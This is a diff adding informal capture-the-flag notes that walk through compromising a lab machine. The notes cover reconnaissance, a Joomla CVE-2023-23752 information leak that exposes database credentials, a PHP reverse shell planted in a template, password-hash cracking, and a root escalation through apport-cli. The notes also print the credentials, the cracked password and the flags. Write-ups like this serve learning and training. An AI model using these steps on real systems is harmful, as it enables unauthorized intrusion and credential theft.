@@ -1,0 +1,104 @@
+did nmap -sV -sC -T4
+
+Nmap scan report for 10.10.11.242
+Host is up (0.10s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.57 seconds
+
+
+added ip to /etc/hosts
+
+nothing inside the webpage
+
+
+tried gobuster vhost -u devvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+didnt find anything
+
+downloaded subdomains-top1million-5000.txt subdomain list (https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt)
+
+its worked, found dev.devvortex.htb subdomain
+
+used gobuster on dev.devvortex.htb
+
+found administrator directory using joomla version 4.2.6, to find out what vers i used http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
+
+found https://github.com/Acceis/exploit-CVE-2023-23752 exploit that can help me get credentials
+
+need to install gem install httpx docopt paint to make the script worked
+
+sudo ruby exploit.rb http://dev.devvortex.htb               
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+
+entered in to dashboard page
+
+entered to system > /templates/cassiopeia/cassiopeia/error.php and injected the php reverse shell (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+opened netcat on port 8081 and get the shell
+
+in /etc/passwd there is user name logan
+
+using mysql -u lewis -p(platform) joomla --password=P4ntherg0t1n5r3c0n##
+
+there is table name sd4fg_users
+
+inside the table i get hash of logan@devvortex.htb $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+
+insert it to file and let the john to crack it john hashhtb --wordlist=/usr/share/wordlists/rockyou.txt 
+
+pass: tequieromucho
+
+succed using ssh 
+
+user flag f683eaa5c90969d60a0eea578f118631
+
+to elavate privileges using sudo -l command
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+
+apport-cli has exploit 
+
+sudo /usr/bin/apport-cli -c /var/crash/(some_crash_file.crash)
+press V (view report)
+!/bin/bash
+
+get root 
+
+cd /root and root flag d9a2804125177f2ea4a3a826ebe5d63f
+
+
+
+
+
+
